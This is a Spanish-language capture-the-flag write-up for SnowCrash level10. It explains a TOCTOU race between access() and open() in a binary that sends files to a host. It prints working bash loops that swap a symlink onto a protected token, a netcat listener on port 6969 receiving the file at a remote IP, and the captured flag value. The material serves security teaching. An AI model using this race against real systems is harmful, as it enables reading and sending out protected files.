1. **Busqueda de archivos**

    Entontramos otro binario `level10` que al ejecutarlo nos pide un `archivo`y `host`
    ```bash
    ./level10 file host
        sends file to host if you have access to it
    level10@SnowCrash:~$ ./level10 token localhost
    You don't have access to token
    ```
    Con el comando strings:
    ```bash
    [...]
    access
    open
    %s file host
	sends file to host if you have access to it
    Connecting to %s:6969 .. 
    Unable to connect to host %s
    .*( )*.
    Unable to write banner to host %s
    Connected!
    Sending file .. 
    Damn. Unable to open file
    Unable to read from file: %s
    wrote file!
    You don't have access to %s
    [...]
    ```
    - Comprueba permisos con access()
    - Luego abre el archivo con open() y lo usa (léido o enviado al "host")
    
    - Verificando las notas de `man access` podemos entender que:
    Si un programa utiliza access() para comprobar si tiene permisos sobre un archivo y, después, en un paso separado, open() abre ese archivo, existe una ventana de tiempo entre ambas acciones. Durante ese intervalo, otro usuario o proceso puede cambiar el archivo original por otro diferente (por ejemplo, mediante un enlace simbólico o reemplazo de archivo). Esto significa que el programa termina abriendo, leyendo o escribiendo en un archivo distinto al que verificó inicialmente, lo que puede generar riesgos de seguridad.  


2. **Explotación**

    Vamos a crear un script que haga lo siguiente:
    - Crear un toggle (bucle) que cambie rapidamente el destino de un enlace simbolico `/tmp/link` entre dos archivos diferentes
        - Uno es un archivo normal y legible `/tmp/ok`
        - El otro es el archivo protegido que queremos leer `~/token`
    El objetivo es que, durante la ejecucion del binario vulnerable `level10`, el enlace simbolico apunte al archivo protegido justo en el momento adecuado, explotando la vulnerabilidad de carrera `(TOCTOU)`

    ```bash
    level10@SnowCrash:~$ vim /tmp/exploit.sh
    level10@SnowCrash:~$ chmod +x /tmp/exploit.sh
    level10@SnowCrash:~$ /tmp/exploit.sh
    You dont have access to /tmp/link
    Contenido: 
    /tmp/exploit.sh: line 14:  1809 Terminated              nc -l 6969 > /tmp/flag
    Connecting to 127.0.0.1:6969 .. Connected!
    Sending file .. wrote file!
    Contenido: woupa2yuojeeaaed06riuj63c
    ```

crer un script en una terminal
vim /tmp/enlace.sh
#!/bin/bash

while true; do
        touch /tmp/flag
        rm -f /tmp/flag
        ln -s /home/user/level10/token /tmp/flag
        rm -f /tmp/flag
done

otro script en otra terminal
vim /tmp/exec.sh
#!/bin/bash

while true; do
        /home/user/level10/level10 /tmp/flag 192.168.18.10
done

las conexiones se muestran en la otra terminal
 nc -lk 6969
 .*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c

explotamos access race condition exploit, el tiempo entre comprabar si tenemos aceso al archivo y el abrir el archivo